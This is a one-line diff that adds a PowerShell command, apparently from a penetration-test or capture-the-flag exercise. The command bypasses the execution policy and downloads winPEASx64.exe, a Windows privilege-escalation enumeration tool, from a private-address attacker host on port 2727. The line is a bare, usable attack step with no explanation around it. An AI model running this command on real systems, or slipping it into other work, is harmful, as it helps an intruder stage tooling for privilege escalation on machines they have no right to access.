@@ -1,0 +1,1 @@
+powershell -ep bypass -c "iwr http://10.10.14.227:2727/winPEASx64.exe -OutFile winPEASx64.exe"
